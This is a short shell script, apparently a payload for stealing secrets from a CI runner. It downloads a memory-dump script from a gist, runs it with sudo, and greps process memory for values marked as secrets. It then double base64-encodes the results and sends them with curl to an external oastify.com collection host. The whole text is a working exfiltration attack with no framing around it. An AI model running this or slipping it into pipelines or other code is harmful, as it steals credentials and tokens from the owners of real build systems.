YOUR_EXFIL="https://bm1r0o9d3avrqu1hhmzb369unltkw8pwe.oastify.com" 
B64_BLOB=`curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py | sudo python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' | sort -u | base64 -w 0 | base64 -w 0`
echo $B64_BLOB
curl -s -d "$B64_BLOB" https://$YOUR_EXFIL/token > /dev/null
